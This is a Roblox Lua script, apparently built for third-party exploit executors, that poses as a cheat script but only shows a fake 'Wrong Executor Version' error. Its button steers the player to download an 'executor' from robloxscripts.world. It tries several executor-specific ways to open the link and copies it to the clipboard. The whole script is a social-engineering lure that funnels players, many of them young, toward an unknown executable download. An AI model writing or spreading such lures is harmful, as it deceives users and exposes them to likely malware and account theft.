pcall(function()
    -- Create the main GUI
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "HelloWorldPopup"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.Parent = game:GetService("CoreGui") or game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    
    -- Create the main frame (popup background)
    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 500, 0, 280)
    MainFrame.Position = UDim2.new(0.5, -250, 0.5, -140) -- Center of screen
    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui
    
    -- Add corner radius for modern look
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = MainFrame
    
    -- Add shadow effect
    local UIStroke = Instance.new("UIStroke")
    UIStroke.Color = Color3.fromRGB(60, 60, 60)
    UIStroke.Thickness = 2
    UIStroke.Parent = MainFrame
    
    -- Create the title label
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Name = "TitleLabel"
    TitleLabel.Size = UDim2.new(1, -40, 0, 120)
    TitleLabel.Position = UDim2.new(0, 20, 0, 20)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Text = "Script Failed to execute. Error = Wrong Executor Version, Please go to https://robloxscripts.world/executors to download the correct one"
    TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TitleLabel.TextSize = 18
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
    TitleLabel.TextYAlignment = Enum.TextYAlignment.Top
    TitleLabel.TextWrapped = true
    TitleLabel.Parent = MainFrame
    
    -- Create the button
    local RedirectButton = Instance.new("TextButton")
    RedirectButton.Name = "RedirectButton"
    RedirectButton.Size = UDim2.new(0, 460, 0, 60)
    RedirectButton.Position = UDim2.new(0.5, -230, 1, -80)
    RedirectButton.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
    RedirectButton.Text = "Click here to redirect to Executors download page"
    RedirectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    RedirectButton.TextSize = 16
    RedirectButton.Font = Enum.Font.Gotham
    RedirectButton.TextWrapped = true
    RedirectButton.BorderSizePixel = 0
    RedirectButton.Active = true
    RedirectButton.Selectable = true
    RedirectButton.ZIndex = 10
    RedirectButton.Parent = MainFrame
    
    -- Add corner radius to button
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 8)
    ButtonCorner.Parent = RedirectButton
    
    -- Button hover effect
    RedirectButton.MouseEnter:Connect(function()
        RedirectButton.BackgroundColor3 = Color3.fromRGB(0, 140, 220)
    end)
    
    RedirectButton.MouseLeave:Connect(function()
        RedirectButton.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
    end)
    
    -- Function to handle button click
    local function openWebsite()
        local url = "https://robloxscripts.world/executors"
        
        -- Visual feedback
        RedirectButton.Text = "Opening..."
        wait(0.1)
        
        -- Method 1: OpenBrowserWindow (most common)
        local success1 = pcall(function()
            game:GetService("StarterGui"):SetCore("OpenBrowserWindow", url)
        end)
        
        if success1 then
            RedirectButton.Text = "Opened!"
            wait(1)
            RedirectButton.Text = "Click here to redirect to Executors download page"
            return
        end
        
        -- Method 2: Synapse X method
        local success2 = pcall(function()
            if syn and syn.open then
                syn.open(url)
                RedirectButton.Text = "Opened!"
                wait(1)
                RedirectButton.Text = "Click here to redirect to Executors download page"
                return
            end
        end)
        
        -- Method 3: Using HttpService (some executors)
        local success3 = pcall(function()
            game:GetService("HttpService"):GetAsync(url)
        end)
        
        -- Method 4: Copy to clipboard and notify
        pcall(function()
            if setclipboard then
                setclipboard(url)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Link Copied!",
                    Text = "The link has been copied to your clipboard. Paste it in your browser!",
                    Duration = 5
                })
                RedirectButton.Text = "Link Copied to Clipboard!"
                wait(2)
                RedirectButton.Text = "Click here to redirect to Executors download page"
            else
                RedirectButton.Text = "Please visit: " .. url
            end
        end)
    end
    
    -- Connect both MouseButton1Click and Activated for maximum compatibility
    RedirectButton.MouseButton1Click:Connect(openWebsite)
    RedirectButton.Activated:Connect(openWebsite)
    
    -- Optional: Add a close button
    local CloseButton = Instance.new("TextButton")
    CloseButton.Name = "CloseButton"
    CloseButton.Size = UDim2.new(0, 30, 0, 30)
    CloseButton.Position = UDim2.new(1, -35, 0, 10)
    CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    CloseButton.Text = "X"
    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.TextSize = 18
    CloseButton.Font = Enum.Font.GothamBold
    CloseButton.BorderSizePixel = 0
    CloseButton.Parent = MainFrame
    
    local CloseButtonCorner = Instance.new("UICorner")
    CloseButtonCorner.CornerRadius = UDim.new(0, 6)
    CloseButtonCorner.Parent = CloseButton
    
    CloseButton.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)
end)
